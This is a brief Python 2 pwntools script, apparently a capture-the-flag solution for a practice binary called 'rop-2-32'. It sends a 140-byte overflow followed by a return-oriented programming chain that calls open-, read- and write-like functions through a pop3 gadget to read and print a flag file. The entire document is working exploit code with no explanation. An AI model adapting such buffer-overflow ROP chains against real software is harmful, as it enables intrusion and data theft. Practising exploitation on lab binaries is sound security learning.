from pwn import *

p = process("./rop-2-32")

pop3 = p32(0x08048689)

flag = p32(0x8048764)

payload = "A" * 140 + p32(0x80483b0) + pop3 + flag + "\x00"*8 +p32(0x8048380) + pop3 +p32(0x3) + p32(0xfff94150) + p32(0x100) + p32(0x80483d0) + "\x00"*4 + p32(0x1) + p32(0xfff94150) + p32(0x100)
print payload
p.sendline(payload)
print p.recv(timeout=1)
